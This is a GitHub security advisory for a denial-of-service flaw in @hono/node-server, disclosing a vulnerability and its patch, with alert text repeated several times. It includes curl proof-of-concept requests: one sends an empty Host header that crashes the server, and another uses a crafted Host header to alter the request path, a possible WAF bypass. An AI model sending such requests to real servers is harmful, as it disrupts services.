# Denial of Service risk when receiving Host header that cannot be parsed

Moderate

[yusukebe](/yusukebe)
published
GHSA-hgxw-5xg3-69jx
Apr 19, 2024

## Package

npm

@hono/node-server
([npm](/advisories?query=ecosystem%3Anpm))

## Affected versions

>=1.3.0 < 1.10.1

## Patched versions

1.10.1

## Description

### Impact

The application hangs when receiving a Host header with a value that `@hono/node-server` can't handle well. Invalid values are those that cannot be parsed by the `URL` as a hostname such as an empty string, slashes `/`, and other strings.

For example, if you have a simple application:

```
import { serve } from '@hono/node-server'
import { Hono } from 'hono'

const app = new Hono()

app.get('/', (c) => c.text('Hello'))

serve(app)
```

Sending a request with a Host header with an empty value to it:

```
curl localhost:3000/ -H "Host: "

```

The results:

```
node:internal/url:775
    this.#updateContext(bindingUrl.parse(input, base));
                                   ^

TypeError: Invalid URL
    at new URL (node:internal/url:775:36)
    at newRequest (/Users/yusuke/work/h/159/node_modules/@hono/node-server/dist/index.js:137:17)
    at Server.<anonymous> (/Users/yusuke/work/h/159/node_modules/@hono/node-server/dist/index.js:399:17)
    at Server.emit (node:events:514:28)
    at Server.emit (node:domain:488:12)
    at parserOnIncoming (node:_http_server:1143:12)
    at HTTPParser.parserOnHeadersComplete (node:_http_common:119:17) {
  code: 'ERR_INVALID_URL',
  input: 'http:///'
}

```
### Patches

The version `1.10.1` includes the fix for this issue. But, you should use `1.11.0`, which has other fixes related to this issue. [#160](https://github.com/honojs/node-server/issues/160) [#161](https://github.com/honojs/node-server/issues/161)

### Workarounds

Nothing. Upgrade your `@hono/node-server`.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

| Hi, Denial of Service vulnerability discovered. PoC Source  ``` import { serve } from '@hono/node-server' import { Hono } from 'hono'  const app = new Hono()  app.get('/*', (c) => {     return c.text("hello") })  serve(app, (info) => {     console.log(`Listening on http://localhost:${info.port}`) // Listening on http://localhost:3000 }) ```  Request  ``` curl localhost:3000/ -H "Host: " ```  As a result, the application stops.  Exception has occurred: TypeError: Invalid URL  In this case, the argument passed to `new URL` will be `http:///` .     [node-server/src/request.ts](https://github.com/honojs/node-server/blob/c22f7500dc64bc08e1f8321f81d148eb061ec256/src/request.ts#L117-L126)  Lines 117 to 126 in [c22f750](/honojs/node-server/commit/c22f7500dc64bc08e1f8321f81d148eb061ec256)   |  | req[urlKey] = new URL( | | --- | --- | |  | `${ | |  | incoming instanceof Http2ServerRequest || | |  | (incoming.socket && (incoming.socket as TLSSocket).encrypted) | |  | ? 'https' | |  | : 'http' | |  | }://${incoming instanceof Http2ServerRequest ? incoming.authority : incoming.headers.host}${ | |  | incoming.url | |  | }` | |  | ).href |     **Suggested fix** It is recommended to validate the Host header.   ---   In addition, it is possible to manipulate the `c.req.path` by including `/` in the Host header. This has not so far led to any direct damage, but it could be used for WAF bypassing, etc., so it is recommended to add this to the validation process.  Source  ``` import { serve } from '@hono/node-server' import { Hono } from 'hono'  const app = new Hono()  app.get('/*', (c) => {     return c.json({         c_env_incoming_url: c.env.incoming.url,         c_req_url: c.req.url,         c_req_path: c.req.path,     }) })  serve(app, (info) => {     console.log(`Listening on http://localhost:${info.port}`) // Listening on http://localhost:3000 }) ```  Request  ``` curl localhost:3000/aaa -H "Host: example.com/bbb?"  ```  Response  ``` { 	"c_env_incoming_url":"/aaa", 	"c_req_url":"http://example.com/bbb?/aaa", 	"c_req_path":"/bbb" } ``` |

| I've created [#162](https://github.com/honojs/node-server/pull/162)  [#162](https://github.com/honojs/node-server/pull/162) would be able to be released immediately in a patch version, as it only suppresses the abnormal termination and does not change the behaviour.  [#160](https://github.com/honojs/node-server/issues/160) and [#161](https://github.com/honojs/node-server/issues/161) may have edge cases affected by the change, so it would be better to calm down and fix them in the next minor version. |

### GitHub Vulnerability Alerts

####
[CVE-2024-32652](https://togithub.com/honojs/node-server/security/advisories/GHSA-hgxw-5xg3-69jx)

### Impact

The application hangs when receiving a Host header with a value that
`@hono/node-server` can't handle well. Invalid values are those that
cannot be parsed by the `URL` as a hostname such as an empty string,
slashes `/`, and other strings.

For example, if you have a simple application:

```ts
import { serve } from '@&#8203;hono/node-server'
import { Hono } from 'hono'

const app = new Hono()

app.get('/', (c) => c.text('Hello'))

serve(app)
```

Sending a request with a Host header with an empty value to it:

```
curl localhost:3000/ -H \"Host: \"
```

The results:

```
node:internal/url:775
    this.#updateContext(bindingUrl.parse(input, base));
                                   ^

TypeError: Invalid URL

    at HTTPParser.parserOnHeadersComplete (node:_http_common:119:17) {
  code: 'ERR_INVALID_URL',
  input: 'http:///'
}
```

### Patches

The version `1.10.1` includes the fix for this issue. But, you should
use `1.11.0`, which has other fixes related to this issue.

### GitHub Vulnerability Alerts

####
[[CVE-2024-32652](https://github.com/advisories/GHSA-hgxw-5xg3-69jx "CVE-2024-32652")](<https://togithub.com/honojs/node-server/security/advisories/GHSA-hgxw-5xg3-69jx>)

### Impact

The application hangs when receiving a Host header with a value that
`@hono/node-server` can't handle well. Invalid values are those that
cannot be parsed by the `URL` as a hostname such as an empty string,
slashes `/`, and other strings.

For example, if you have a simple application:

```ts
import { serve } from '@&#8203;hono/node-server'
import { Hono } from 'hono'

const app = new Hono()

app.get('/', (c) => c.text('Hello'))

serve(app)
```

Sending a request with a Host header with an empty value to it:

```
curl localhost:3000/ -H "Host: "
```

The results:

```
node:internal/url:775
    this.#updateContext(bindingUrl.parse(input, base));
                                   ^

TypeError: Invalid URL

    at HTTPParser.parserOnHeadersComplete (node:_http_common:119:17) {

}
```
